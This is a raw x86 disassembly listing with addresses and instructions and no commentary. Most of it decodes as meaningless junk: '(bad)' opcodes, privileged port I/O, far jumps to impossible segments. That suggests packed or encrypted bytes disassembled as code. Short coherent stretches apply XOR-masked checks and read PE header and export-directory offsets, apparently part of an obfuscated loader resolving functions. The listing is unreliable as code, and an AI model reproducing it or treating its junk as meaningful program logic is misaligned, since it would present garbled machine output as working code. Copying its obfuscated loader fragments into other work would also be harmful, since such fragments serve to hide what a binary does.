  40bdfe:	iret   
  40bdff:	cwde   
  40be00:	sub    al,0x9a
  40be02:	mov    cl,0x6d
  40be04:	mov    eax,0x421ba339
  40be09:	xor    eax,0x4a943ace
  40be0e:	mov    eax,ds:0x681bdfec
  40be13:	xor    DWORD PTR [ebx-0x24],edi
  40be16:	mov    ecx,0x8af15e3
  40be1b:	adc    DWORD PTR [eax+ecx*1-0x6b],esi
  40be1f:	inc    edx
  40be20:	add    eax,0x50437d60
  40be25:	jo     0x40be7b
  40be27:	dec    ecx
  40be28:	mov    ebp,0x8721ec38
  40be2d:	mov    DWORD PTR [ecx],esp
  40be2f:	mov    ecx,DWORD PTR [esi+0x21c25860]
  40be35:	int    0x4a
  40be37:	cmp    al,0xc
  40be39:	or     DWORD PTR [ebp+ebx*8+0x6ad4816c],0x8836dca1
  40be44:	cmp    ebp,0xf
  40be47:	push   ecx
  40be48:	push   cs
  40be49:	std    
  40be4a:	test   DWORD PTR [esi-0x3c],ebx
  40be4d:	mov    cl,0x75
  40be4f:	xchg   edi,eax
  40be50:	push   esp
  40be51:	aas    
  40be52:	sbb    DWORD PTR [ecx],edx
  40be54:	mov    ebp,eax
  40be56:	jns    0x40be05
  40be58:	mov    esp,0xe6b88a9d
  40be5d:	mov    edi,0xd54654b3
  40be62:	test   BYTE PTR [eax-0xd],cl
  40be65:	and    BYTE PTR [ebx+0x4a49a547],al
  40be6b:	in     al,0xfb
  40be6d:	or     eax,0x968fe9f3
  40be72:	pop    ds
  40be73:	dec    eax
  40be74:	cmp    DWORD PTR [ecx+ebp*2+0x75d9099],ebx
  40be7b:	xor    al,0xf9
  40be7d:	aam    0xc4
  40be7f:	mov    ds:0x87849a75,al
  40be84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be85:	or     al,dl
  40be87:	popf   
  40be88:	push   cs
  40be89:	ja     0x40be65
  40be8b:	arpl   WORD PTR [ecx-0x2b099c61],ax
  40be91:	leave  
  40be92:	cli    
  40be93:	inc    ecx
  40be94:	loope  0x40be35
  40be96:	out    0x18,al
  40be98:	js     0x40bedf
  40be9a:	xor    BYTE PTR [eax+0x37c78f85],al
  40bea0:	ja     0x40be90
  40bea2:	mov    dh,cl
  40bea4:	push   esp
  40bea5:	retf   
  40bea6:	cwde   
  40bea7:	ffreep st(7)
  40bea9:	(bad)  
  40beaa:	into   
  40beab:	int3   
  40beac:	out    dx,eax
  40bead:	sub    edx,DWORD PTR [ebp-0x781c5116]
  40beb3:	jae    0x40be86
  40beb5:	call   0x32a7b5c0
  40beba:	stos   DWORD PTR es:[edi],eax
  40bebb:	loopne 0x40beb6
  40bebd:	lea    ebx,[edx]
  40bebf:	add    BYTE PTR gs:[esi],ah
  40bec2:	aas    
  40bec3:	in     al,0xe9
  40bec5:	call   0xcdc:0xfd8c795d
  40becc:	test   ebp,0x29688a55
  40bed2:	out    0xae,eax
  40bed4:	repz daa 
  40bed6:	mov    ah,BYTE PTR [ecx+0x6dce44c0]
  40bedc:	add    eax,0x7cea28ea
  40bee1:	lea    ebp,[edx+0x1b6bf466]
  40bee7:	mov    cs,WORD PTR [ecx]
  40bee9:	xchg   BYTE PTR [esi-0x181478db],dh
  40beef:	jmp    0xbdf57bd9
  40bef4:	sbb    eax,0x679d8523
  40bef9:	jmp    FWORD PTR [edi-0x2b]
  40befc:	les    eax,FWORD PTR [esi]
  40befe:	dec    ebx
  40beff:	cli    
  40bf00:	xchg   BYTE PTR [esi-0x35da5bff],al
  40bf06:	(bad)  
  40bf07:	js     0x40becc
  40bf09:	jo     0x40bea0
  40bf0b:	inc    edi
  40bf0c:	mov    dh,0x56
  40bf0e:	push   esi
  40bf0f:	sahf   
  40bf10:	daa    
  40bf11:	nop
  40bf12:	fmul   QWORD PTR [edi-0x5518d3ca]
  40bf18:	jmp    0x17c1:0xba62534f
  40bf1f:	xchg   ecx,eax
  40bf20:	jmp    FWORD PTR [edx+0x43]
  40bf23:	mov    al,gs:0x1fd8408d
  40bf29:	inc    eax
  40bf2a:	cmp    esp,edx
  40bf2c:	int    0x3e
  40bf2e:	sbb    eax,0x5acefe22
  40bf33:	daa    
  40bf34:	dec    ecx
  40bf35:	sub    ebx,DWORD PTR [ecx]
  40bf37:	mov    bh,0xb6
  40bf3a:	(bad)  
  40bf3b:	fwait
  40bf3c:	xchg   esi,eax
  40bf3d:	outs   dx,DWORD PTR ds:[esi]
  40bf3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf3f:	dec    esp
  40bf40:	out    0x8,eax
  40bf42:	cmp    esp,DWORD PTR [edx-0x20]
  40bf45:	sbb    DWORD PTR [edx+0x1b],0xffffffb7
  40bf49:	add    al,0xfd
  40bf4b:	packssdw mm1,mm2
  40bf4e:	xchg   esp,eax
  40bf4f:	add    BYTE PTR [edi-0xa],ch
  40bf52:	inc    esi
  40bf53:	call   0x49f0:0xd3a7d492
  40bf5a:	pop    ss
  40bf5b:	mov    WORD PTR [edx-0x457bc833],?
  40bf61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf62:	add    eax,0x5418de9c
  40bf67:	push   0xffffffec
  40bf69:	imul   ecx,ebp,0xedd91a77
  40bf6f:	call   0xd44e:0x837a
  40bf75:	dec    ecx
  40bf76:	test   BYTE PTR [edi],0x6e
  40bf79:	add    al,0x24
  40bf7b:	adc    esi,DWORD PTR [esi]
  40bf7d:	adc    BYTE PTR [eax+ebp*2],dh
  40bf80:	sbb    dl,BYTE PTR [edi*4-0x6c6ae207]
  40bf87:	jno    0x40bf92
  40bf89:	fisttp DWORD PTR [ecx]
  40bf8b:	sub    eax,0x2e721293
  40bf90:	jo     0x40bfac
  40bf92:	push   edi
  40bf93:	push   ds
  40bf94:	fmul   QWORD PTR [edx+0x38]
  40bf97:	sub    esi,edx
  40bf99:	sbb    al,0xcf
  40bf9b:	mov    dl,BYTE PTR [ebp+edx*8-0x27cc3db5]
  40bfa2:	add    BYTE PTR [eax],cl
  40bfa4:	ja     0x40bf69
  40bfa6:	stos   DWORD PTR es:[edi],eax
  40bfa7:	loope  0x40bfaa
  40bfa9:	dec    esi
  40bfaa:	pop    ds
  40bfab:	push   es
  40bfac:	pop    ds
  40bfad:	push   0xccafd8bf
  40bfb2:	outs   dx,DWORD PTR ds:[esi]
  40bfb3:	dec    edx
  40bfb4:	or     dh,al
  40bfb6:	xor    al,BYTE PTR [eax+0x1d]
  40bfb9:	shl    DWORD PTR [ebx-0x6d],1
  40bfbc:	inc    edx
  40bfbd:	sbb    ah,bl
  40bfbf:	aaa    
  40bfc0:	ins    DWORD PTR es:[edi],dx
  40bfc1:	shl    BYTE PTR [edi-0x7e],cl
  40bfc4:	xchg   DWORD PTR [esi-0x72],ebx
  40bfc7:	fistp  WORD PTR [ebx+0x32]
  40bfca:	jmp    0x8d8fcfcd
  40bfcf:	test   esi,edx
  40bfd1:	and    DWORD PTR [esp],0xf15aa6e0
  40bfd8:	aaa    
  40bfd9:	pop    ecx
  40bfda:	xchg   esp,eax
  40bfdb:	and    cl,BYTE PTR [ecx-0x5a]
  40bfde:	mov    ecx,0x891f5048
  40bfe3:	rcr    edx,0xfd
  40bfe6:	cmp    edx,eax
  40bfe8:	fs dec eax
  40bfea:	xchg   edx,eax
  40bfeb:	xor    DWORD PTR [edx],edx
  40bfed:	push   ecx
  40bfee:	ret    0x9a32
  40bff1:	in     eax,0xe6
  40bff3:	inc    esi
  40bff4:	mov    esi,0x17f8c008
  40bff9:	sub    bh,BYTE PTR ds:0x34b800b7
  40bfff:	inc    ebp
  40c000:	stos   BYTE PTR es:[edi],al
  40c001:	jp     0x40c017
  40c003:	je     0x40c04b
  40c005:	pop    esi
  40c006:	xor    DWORD PTR [ebp+0x7d10b389],ebx
  40c00c:	pop    ebp
  40c00d:	scas   eax,DWORD PTR es:[edi]
  40c00e:	lods   eax,DWORD PTR ds:[esi]
  40c00f:	ret    
  40c010:	sub    al,0x9f
  40c012:	push   esp
  40c013:	dec    esp
  40c014:	and    al,0xd7
  40c016:	jne    0x40bf9a
  40c018:	fisttp DWORD PTR [eax]
  40c01a:	xor    ecx,DWORD PTR [ebx]
  40c01c:	push   ss
  40c01d:	cmp    dl,BYTE PTR [ebp+0x42fad24c]
  40c023:	mov    ecx,0x1bc36d5b
  40c028:	stos   BYTE PTR es:[edi],al
  40c029:	add    DWORD PTR [esi-0x2f],esi
  40c02c:	push   esp
  40c02d:	mov    al,0x12
  40c02f:	loopne 0x40c006
  40c031:	and    esp,DWORD PTR [edi+0x25]
  40c034:	and    BYTE PTR [edx-0x30],cl
  40c037:	inc    eax
  40c038:	aaa    
  40c039:	xor    DWORD PTR [edx+ebp*2+0x186f2107],edi
  40c040:	nop
  40c041:	adc    bl,dl
  40c043:	aas    
  40c044:	sbb    DWORD PTR [esi+0x27],esp
  40c047:	cmp    DWORD PTR [esi],ebp
  40c049:	pop    ds
  40c04a:	xchg   bl,ch
  40c04c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c04d:	(bad)  
  40c04e:	popa   
  40c04f:	cdq    
  40c050:	jne    0x40c080
  40c052:	add    edi,esi
  40c054:	sub    al,BYTE PTR ds:0x251fa912
  40c05a:	add    esi,eax
  40c05c:	xchg   esp,eax
  40c05d:	jp     0x40c072
  40c05f:	mov    eax,ds:0x4f8c449b
  40c064:	stc    
  40c065:	xchg   edx,eax
  40c066:	adc    esi,DWORD PTR [edx+0x3c]
  40c069:	(bad)  
  40c06b:	mov    cl,0xf6
  40c06d:	mov    bh,0xe9
  40c06f:	ins    DWORD PTR es:[edi],dx
  40c070:	or     al,0x87
  40c072:	bnd jne 0x40c0d4
  40c075:	bound  esi,QWORD PTR [edx+0x31]
  40c078:	aad    0xb4
  40c07a:	inc    esi
  40c07b:	push   ecx
  40c07c:	add    DWORD PTR [eax-0x24572646],eax
  40c082:	into   
  40c083:	and    DWORD PTR [edi+0x20f1b95b],edi
  40c089:	ret    0x61a8
  40c08c:	sbb    eax,DWORD PTR [ebp-0x54cec372]
  40c092:	retf   
  40c093:	push   edx
  40c094:	jmp    0x40c0e5
  40c096:	div    DWORD PTR [ebp+0x3e]
  40c099:	ins    DWORD PTR es:[edi],dx
  40c09a:	scas   al,BYTE PTR es:[edi]
  40c09b:	mov    ds:0x2f5685ff,eax
  40c0a0:	bound  esi,QWORD PTR fs:[esi-0x5810bda1]
  40c0a7:	cmp    dl,BYTE PTR [edx-0x1e]
  40c0aa:	cdq    
  40c0ab:	and    dl,bh
  40c0ad:	pop    ebx
  40c0ae:	sbb    eax,DWORD PTR [ebp+0x63]
  40c0b1:	pop    ds
  40c0b2:	lods   eax,DWORD PTR ds:[esi]
  40c0b3:	pextrw esp,(bad),0xc5
  40c0b5:	arpl   WORD PTR [esi+0x784a4e1e],bp
  40c0bb:	pushf  
  40c0bc:	xor    al,0x45
  40c0be:	jecxz  0x40c0bd
  40c0c0:	popf   
  40c0c1:	pop    es
  40c0c2:	les    edx,FWORD PTR [ecx]
  40c0c4:	xchg   esp,eax
  40c0c5:	adc    al,0x6b
  40c0c7:	sub    ecx,eax
  40c0c9:	mov    ax,WORD PTR [ebp-0x4]
  40c0cd:	movzx  eax,ax
  40c0d0:	sub    ecx,edi
  40c0d2:	cmp    eax,ecx
  40c0d4:	mov    eax,DWORD PTR [ebp-0x14]
  40c0d7:	movzx  ecx,WORD PTR [ebp-0x4]
  40c0db:	jg     0x40c0f0
  40c0e1:	xor    eax,esi
  40c0e3:	sub    ecx,eax
  40c0e5:	sub    ecx,edi
  40c0e7:	mov    WORD PTR [ebp-0x4],cx
  40c0eb:	jmp    0x40c44a
  40c0f0:	xor    eax,esi
  40c0f2:	jmp    0x40c43f
  40c0f7:	nop
  40c0f8:	push   esp
  40c0f9:	in     al,dx
  40c0fa:	shr    eax,1
  40c0fc:	jno    0x40c0af
  40c0fe:	push   ebp
  40c0ff:	mov    ss,WORD PTR [ecx+esi*8+0x70]
  40c103:	inc    ebx
  40c104:	add    eax,0xfb6941a5
  40c109:	jle    0x40c189
  40c10b:	cs jge 0x40c18c
  40c10e:	jle    0x40c11c
  40c110:	stos   DWORD PTR es:[edi],eax
  40c111:	imul   esi,DWORD PTR [esi-0x6f2c6f80],0xffffffcc
  40c118:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c119:	push   cs
  40c11a:	mov    DWORD PTR [edi-0x54],ebp
  40c11d:	cmp    eax,0x5a239a6f
  40c122:	repz adc eax,0x35088d13
  40c128:	ss in  eax,0x23
  40c12b:	je     0x40c129
  40c12d:	jge    0x40c0b7
  40c12f:	push   esp
  40c130:	js     0x40c174
  40c132:	or     eax,0xe9397c79
  40c137:	pop    ebp
  40c138:	jnp    0x40c0f6
  40c13a:	(bad)  
  40c13c:	jno    0x40c112
  40c13e:	sar    BYTE PTR [ebx+0x12],1
  40c141:	dec    eax
  40c142:	add    eax,0x3e960db9
  40c147:	mov    ah,0xc9
  40c149:	mov    ch,0xe1
  40c14b:	rol    DWORD PTR [ecx+0x53f4fd43],0x67
  40c152:	push   ecx
  40c153:	dec    esp
  40c154:	shl    BYTE PTR [ecx],cl
  40c156:	lahf   
  40c157:	xchg   edx,eax
  40c158:	cwde   
  40c159:	push   ds
  40c15a:	mov    bh,0xec
  40c15c:	pop    esi
  40c15d:	jns    0x40c1c3
  40c15f:	push   0x49554057
  40c164:	aam    0xf6
  40c166:	jle    0x40c106
  40c168:	pop    edi
  40c169:	popf   
  40c16a:	scas   al,BYTE PTR es:[edi]
  40c16b:	(bad)  
  40c16c:	mov    ds:0x772db925,eax
  40c171:	mov    ebp,0x902dcc27
  40c176:	dec    ecx
  40c177:	push   ebp
  40c178:	inc    edi
  40c179:	sub    DWORD PTR [ebx],ebx
  40c17b:	in     al,dx
  40c17c:	jge    0x40c177
  40c17e:	jnp    0x40c17e
  40c180:	xlat   BYTE PTR ds:[ebx]
  40c181:	push   esi
  40c182:	push   cs
  40c183:	xchg   esp,eax
  40c184:	or     ch,BYTE PTR [ecx]
  40c186:	fs jno 0x40c198
  40c189:	ins    DWORD PTR es:[edi],dx
  40c18a:	addr16 push es
  40c18c:	mov    ch,0x35
  40c18e:	test   eax,0xad42c9d7
  40c193:	and    bl,BYTE PTR [esi]
  40c195:	inc    ecx
  40c196:	push   ecx
  40c197:	and    eax,esi
  40c199:	shl    DWORD PTR [eax+0x3ee9bd8f],cl
  40c19f:	xchg   esi,eax
  40c1a0:	stos   DWORD PTR es:[edi],eax
  40c1a1:	mov    eax,ds:0xe04b3735
  40c1a6:	fcom   QWORD PTR [ebp-0xe4f6b5c]
  40c1ac:	xchg   ebp,eax
  40c1ad:	fwait
  40c1ae:	jmp    0x40c18c
  40c1b0:	ret    0x3b3b
  40c1b3:	push   ecx
  40c1b4:	imul   edi,ebp,0xd53d6ca2
  40c1ba:	(bad)  
  40c1bc:	mov    eax,ds:0x542a6707
  40c1c1:	add    eax,0x8ef7167f
  40c1c6:	pusha  
  40c1c7:	jg     0x40c1dd
  40c1c9:	fidivr WORD PTR [ebp+eax*8+0xbb9b16e]
  40c1d0:	ret    0x6f0e
  40c1d3:	nop
  40c1d4:	mov    eax,0xaed20c49
  40c1d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1da:	jo     0x40c22d
  40c1dc:	jg     0x40c190
  40c1de:	je     0x40c244
  40c1e0:	add    al,0xa8
  40c1e2:	and    al,0xa3
  40c1e4:	stos   DWORD PTR es:[edi],eax
  40c1e5:	cli    
  40c1e6:	(bad)  
  40c1e7:	popf   
  40c1e8:	jo     0x40c1be
  40c1ea:	add    al,BYTE PTR [eax+0x3c666837]
  40c1f0:	mov    edx,0xb3ebc962
  40c1f5:	es xor eax,0x60706d05
  40c1fb:	sbb    ah,BYTE PTR [esi-0x7b]
  40c1fe:	push   ss
  40c1ff:	dec    esp
  40c200:	data16 mov al,ds:0x52c61e96
  40c206:	xchg   esp,eax
  40c207:	cmp    DWORD PTR [edx],edi
  40c209:	push   edi
  40c20a:	jg     0x40c190
  40c20c:	out    dx,al
  40c20d:	jmp    0x40e2:0x43d482a9
  40c214:	xchg   esi,eax
  40c215:	loope  0x40c203
  40c217:	call   DWORD PTR ds:0x99f9e2e0
  40c21d:	xchg   esi,eax
  40c21e:	imul   eax,ecx,0x9
  40c221:	mov    ebp,0xf9a6452c
  40c226:	xor    al,0x30
  40c228:	sbb    ah,BYTE PTR [ecx-0x3fe0b5f2]
  40c22e:	hlt    
  40c22f:	fbld   TBYTE PTR [ebp+0x718db585]
  40c235:	dec    esi
  40c236:	pushf  
  40c237:	pop    esi
  40c238:	std    
  40c239:	test   eax,0x135afdf5
  40c23e:	out    0xab,eax
  40c240:	adc    ecx,DWORD PTR [esi+0x6d1c1355]
  40c246:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c247:	xchg   ebx,eax
  40c248:	vpunpckhdq xmm2,xmm6,XMMWORD PTR [edx+esi*2-0x383a2561]
  40c251:	adc    al,0xf4
  40c253:	cs inc edx
  40c255:	xor    al,0x95
  40c257:	repz push cs
  40c259:	enter  0x18a3,0xb6
  40c25d:	dec    edx
  40c25e:	gs int 0xaa
  40c261:	std    
  40c262:	jns    0x40c2a9
  40c264:	adc    DWORD PTR [eax],0xf8683e9f
  40c26a:	scas   al,BYTE PTR es:[edi]
  40c26b:	dec    ebp
  40c26c:	sbb    DWORD PTR ds:0x826c496c,esp
  40c272:	(bad)
  40c276:	sbb    BYTE PTR ds:0x49b69e77,al
  40c27c:	out    0xa1,al
  40c27e:	dec    edi
  40c27f:	or     al,0x7b
  40c281:	jmp    0x40c2a3
  40c283:	sbb    DWORD PTR [edx+0x63],esi
  40c286:	pop    esi
  40c287:	in     eax,dx
  40c288:	jb     0x40c263
  40c28a:	push   0xd982a141
  40c28f:	jbe    0x40c2e3
  40c291:	xor    edi,ebx
  40c293:	rcr    DWORD PTR [ecx+ebx*1],0x34
  40c297:	push   es
  40c298:	popf   
  40c299:	adc    bl,ch
  40c29b:	scas   eax,DWORD PTR es:[edi]
  40c29c:	mov    ds:0x3650a210,eax
  40c2a1:	or     BYTE PTR [eax+eiz*1],ah
  40c2a4:	ja     0x40c28d
  40c2a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2a7:	icebp  
  40c2a8:	das    
  40c2a9:	push   ebp
  40c2aa:	cmc    
  40c2ab:	enter  0x1abe,0x79
  40c2af:	iret   
  40c2b0:	xchg   edi,eax
  40c2b1:	adc    al,BYTE PTR [ecx+0x6d]
  40c2b4:	sbb    al,0x6c
  40c2b6:	adc    edi,DWORD PTR [edx+eiz*8-0x4f14faca]
  40c2bd:	call   0xbfe12ead
  40c2c2:	in     al,0x48
  40c2c4:	(bad)  
  40c2c5:	jcxz   0x40c2bf
  40c2c8:	cmp    cl,ch
  40c2ca:	jp     0x40c2c6
  40c2cc:	and    dl,BYTE PTR [ecx-0x46078627]
  40c2d2:	into   
  40c2d3:	push   eax
  40c2d4:	fdivr  QWORD PTR [esi-0x56]
  40c2d7:	jg     0x40c325
  40c2d9:	loope  0x40c359
  40c2db:	inc    ebp
  40c2dc:	inc    ebx
  40c2dd:	pop    edx
  40c2de:	xchg   edi,eax
  40c2df:	mov    WORD PTR [ebx-0x11],cx
  40c2e3:	push   0xcd8bb0a4
  40c2e8:	add    al,0xf
  40c2ea:	sub    al,0xd4
  40c2ec:	pop    ss
  40c2ed:	adc    al,0x2f
  40c2ef:	pop    ebx
  40c2f0:	push   esp
  40c2f1:	xchg   ebx,eax
  40c2f2:	or     dh,BYTE PTR [ebx]
  40c2f4:	enter  0x7f29,0xec
  40c2f8:	imul   DWORD PTR [eax+edi*8-0x5a]
  40c2fc:	pushf  
  40c2fd:	sub    eax,0xde448eab
  40c302:	repz add dh,BYTE PTR [eax+edx*4+0x8]
  40c307:	xchg   BYTE PTR [edi],dh
  40c309:	push   ebp
  40c30a:	xchg   ebx,eax
  40c30b:	jg     0x40c328
  40c30d:	pop    eax
  40c30e:	mov    dl,BYTE PTR [eax+0x2f]
  40c311:	(bad)  
  40c312:	xchg   edx,eax
  40c313:	mov    esi,0x2b354a93
  40c318:	cmp    edi,DWORD PTR [ebx+0x429d3770]
  40c31e:	ds inc ecx
  40c320:	add    ecx,edi
  40c322:	inc    eax
  40c323:	bound  ebp,QWORD PTR [esi+eiz*4+0x64]
  40c327:	adc    BYTE PTR ds:0xc900a6a9,bl
  40c32d:	pop    ebx
  40c32e:	aam    0x62
  40c330:	test   eax,0x1e708772
  40c335:	dec    esi
  40c336:	pop    esp
  40c337:	mov    cs,WORD PTR [eax+ebp*2-0x6e]
  40c33b:	mov    ds:0x1e5d33b3,eax
  40c340:	stos   DWORD PTR es:[edi],eax
  40c341:	xlat   BYTE PTR fs:[ebx]
  40c343:	mov    al,0xbf
  40c345:	into   
  40c346:	push   esp
  40c347:	dec    ebx
  40c348:	add    eax,0xc9b1d20a
  40c34d:	and    DWORD PTR [ebx+0x47],esp
  40c350:	mov    cl,0x9f
  40c352:	sub    eax,0x2da552a
  40c357:	or     eax,DWORD PTR [eax]
  40c359:	or     edx,esp
  40c35b:	dec    edi
  40c35c:	pop    ds
  40c35d:	mov    edx,0x8fa82a6
  40c362:	in     al,0xc7
  40c364:	jp     0x40c365
  40c366:	jg     0x40c35b
  40c368:	ds pusha 
  40c36a:	mov    bh,bh
  40c36c:	rcr    BYTE PTR [esi-0x3f4dbe39],0xf7
  40c373:	repz push ecx
  40c375:	sub    al,BYTE PTR [esi]
  40c377:	dec    edi
  40c378:	lea    edi,[edx+0x662235de]
  40c37e:	pop    ebp
  40c37f:	jbe    0x40c37f
  40c381:	popf   
  40c382:	inc    ebx
  40c383:	sub    DWORD PTR [eiz*2+0x22b27ce4],esp
  40c38a:	or     dh,BYTE PTR [edx+0x54]
  40c38d:	pop    eax
  40c38e:	xor    BYTE PTR [eax+0x1120edac],bl
  40c394:	rcr    eax,cl
  40c396:	xchg   ebp,eax
  40c397:	inc    eax
  40c398:	add    al,0x3a
  40c39a:	popf   
  40c39b:	retf   
  40c39c:	pop    ebp
  40c39d:	aam    0x11
  40c39f:	cmp    al,0xc
  40c3a1:	sbb    ebx,0x2c91e918
  40c3a7:	xor    DWORD PTR [edi],0xe61ef6b6
  40c3ad:	out    dx,al
  40c3ae:	inc    ebp
  40c3af:	jmp    0x496d:0x44a7bb06
  40c3b6:	fstp   st(5)
  40c3b8:	adc    DWORD PTR [ecx+0x66],0xd
  40c3bc:	ror    BYTE PTR [edi],cl
  40c3be:	add    esi,DWORD PTR [ebx]
  40c3c0:	fnstsw WORD PTR [edx+eax*2]
  40c3c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3c4:	lock out 0x64,eax
  40c3c7:	jl     0x40c38d
  40c3c9:	std    
  40c3ca:	adc    BYTE PTR [edi+ecx*1-0x9b8b988],bl
  40c3d1:	push   esp
  40c3d2:	mov    WORD PTR [ecx+ebp*2-0x9],gs
  40c3d6:	(bad)
  40c3d9:	out    dx,al
  40c3da:	pop    ax
  40c3dc:	in     eax,0x8d
  40c3de:	scas   al,BYTE PTR es:[edi]
  40c3df:	adc    BYTE PTR [esi+0x7672f556],bh
  40c3e5:	sbb    DWORD PTR [ecx-0x4d420497],ebp
  40c3eb:	test   DWORD PTR [edi-0x5659febe],esi
  40c3f1:	aas    
  40c3f2:	cdq    
  40c3f3:	cwde   
  40c3f4:	cwde   
  40c3f5:	into   
  40c3f6:	mov    ch,0x1f
  40c3f8:	popa   
  40c3f9:	les    edx,FWORD PTR [ecx+0x1a6e1fb1]
  40c3ff:	or     al,0xfc
  40c401:	adc    bh,BYTE PTR [edi]
  40c403:	lds    ecx,FWORD PTR [ebx-0x48]
  40c406:	loop   0x40c3d8
  40c408:	ds das 
  40c40a:	ss push esi
  40c40c:	div    BYTE PTR ds:0xbdab8d09
  40c412:	popf   
  40c413:	add    esp,DWORD PTR [ecx+0x74]
  40c416:	rcr    DWORD PTR [ebp+0x71ce05d8],1
  40c41c:	mov    bh,0xa3
  40c41e:	push   esi
  40c41f:	mov    ds:0xc7680054,eax
  40c424:	(bad)  
  40c425:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c426:	xor    DWORD PTR [ecx-0x32],ecx
  40c429:	inc    ebp
  40c42a:	jle    0x40c428
  40c42c:	or     al,BYTE PTR [eax+0x77]
  40c42f:	js     0x40c414
  40c431:	push   edi
  40c432:	jp     0x40c41f
  40c434:	aaa    
  40c435:	(bad)  
  40c436:	aas    
  40c437:	dec    edx
  40c438:	dec    esp
  40c439:	dec    edx
  40c43a:	pop    edx
  40c43b:	jnp    0x40c3d0
  40c43d:	mov    esi,gs
  40c43f:	lea    eax,[eax+ecx*1+0x32729b]
  40c446:	mov    WORD PTR [ebp-0x4],ax
  40c44a:	mov    eax,DWORD PTR [ebp-0xc]
  40c44d:	cmp    eax,ebx
  40c44f:	je     0x40c463
  40c455:	mov    eax,DWORD PTR [ebp-0x8]
  40c458:	mov    DWORD PTR [eax],0x60341e89
  40c45e:	jmp    0x40cba4
  40c463:	mov    eax,DWORD PTR [ebp+0x8]
  40c466:	mov    ecx,DWORD PTR [ebp-0x8]
  40c469:	xor    eax,esi
  40c46b:	add    eax,edi
  40c46d:	cmp    DWORD PTR [ecx],eax
  40c46f:	je     0x40cb8c
  40c475:	mov    ecx,DWORD PTR [ebp-0x18]
  40c478:	mov    eax,DWORD PTR [ebp-0x8]
  40c47b:	mov    eax,DWORD PTR [eax]
  40c47d:	mov    eax,DWORD PTR [eax+0x3c]
  40c480:	lea    ecx,[ecx*8+0x78]
  40c487:	add    eax,ecx
  40c489:	jmp    0x40c7d6
  40c48e:	ffree  st(2)
  40c490:	les    esp,FWORD PTR ds:0xc2dd21e1
  40c496:	xchg   ebp,eax
  40c497:	(bad)  
  40c498:	sub    edx,DWORD PTR [edi-0x75]
  40c49b:	(bad)  
  40c49c:	ja     0x40c4bf
  40c49e:	sbb    DWORD PTR [edi+0x7d2e7e7e],eax
  40c4a4:	jle    0x40c524
  40c4a6:	je     0x40c4ee
  40c4a8:	(bad)  
  40c4aa:	aas    
  40c4ab:	jl     0x40c50e
  40c4ad:	pcmpeqb mm7,QWORD PTR [ebx-0xf]
  40c4b1:	cmp    al,dl
  40c4b3:	adc    eax,0x737e0ba8
  40c4b8:	dec    ebp
  40c4b9:	je     0x40c4a4
  40c4bb:	inc    ecx
  40c4bc:	inc    ebx
  40c4bd:	ins    DWORD PTR es:[edi],dx
  40c4be:	sub    eax,0x63a3f486
  40c4c3:	(bad)  
  40c4c4:	pop    esp
  40c4c5:	push   es
  40c4c6:	mov    ch,al
  40c4c8:	dec    ebp
  40c4c9:	popf   
  40c4ca:	adc    DWORD PTR [eax+0x41],esp
  40c4cd:	xchg   al,cl
  40c4cf:	sub    DWORD PTR [ecx+0x18f64175],ebx
  40c4d5:	or     al,BYTE PTR [esi]
  40c4d7:	jnp    0x40c4cf
  40c4d9:	lds    ebx,FWORD PTR [ebx+0x43]
  40c4dc:	dec    edi
  40c4dd:	or     dl,BYTE PTR [edi+0x75c101f3]
  40c4e3:	and    al,0xae
  40c4e5:	sbb    ebp,ebx
  40c4e7:	and    ebx,edx
  40c4e9:	sbb    ecx,DWORD PTR [edi-0x34]
  40c4ec:	int    0xed
  40c4ee:	xchg   DWORD PTR [ebp+ebp*1-0x41],edi
  40c4f2:	jmp    0x40c56d
  40c4f4:	imul   ebp,ebp,0x29
  40c4f7:	mov    ebx,0x519de261
  40c4fc:	pusha  
  40c4fd:	cmp    esp,ecx
  40c4ff:	sar    cl,0xbf
  40c502:	and    BYTE PTR [ebx+0x421258d2],0x93
  40c509:	mov    ebx,0xbe0eb7ec
  40c50e:	loop   0x40c52e
  40c510:	xor    al,0xf2
  40c512:	mov    edi,0x118f5f2a
  40c517:	cdq    
  40c518:	inc    esi
  40c519:	mov    ds:0x51e0f2df,al
  40c51e:	loopne 0x40c4bd
  40c520:	je     0x40c578
  40c522:	cmc    
  40c523:	adc    ecx,esi
  40c525:	pop    ss
  40c526:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40c528:	jle    0x40c54c
  40c52a:	jo     0x40c555
  40c52c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c52d:	fwait
  40c52e:	mov    eax,ds:0x4d38807f
  40c533:	cmp    DWORD PTR [esi-0x40],ecx
  40c536:	mov    fs,WORD PTR [ebx+0x60]
  40c539:	mov    ebx,0xcb7fb197
  40c53e:	icebp  
  40c53f:	in     al,dx
  40c540:	xchg   BYTE PTR [eax+ecx*8],dh
  40c543:	add    ebx,ebx
  40c545:	sub    al,0x44
  40c547:	cmp    esp,DWORD PTR [esi]
  40c549:	fcomip st,st(0)
  40c54b:	sbb    ebp,0xfedafb78
  40c551:	clc    
  40c552:	push   es
  40c553:	aad    0x3a
  40c555:	add    bl,0x9f
  40c558:	cmp    DWORD PTR [edi-0x566401d6],ebp
  40c55e:	and    DWORD PTR [eax+0x3b],0x5a533d51
  40c565:	mov    eax,ds:0x3f650c9d
  40c56a:	mov    al,0x15
  40c56c:	and    edx,ebp
  40c56e:	fnstsw WORD PTR [ebx-0x7486388d]
  40c574:	mov    ah,0xd6
  40c576:	sbb    DWORD PTR [eax-0x3e663c49],esi
  40c57c:	retf   
  40c57d:	in     eax,0xc6
  40c57f:	cmp    ebp,ecx
  40c581:	mov    esp,0xc2af5950
  40c586:	ret    0xa4a5
  40c589:	inc    BYTE PTR [ecx*8+0x1088acd2]
  40c590:	ds mov edx,0x3261ae32
  40c596:	xchg   edx,eax
  40c597:	inc    esp
  40c599:	mov    gs,WORD PTR [ecx-0x2b701df7]
  40c59f:	jg     0x40c602
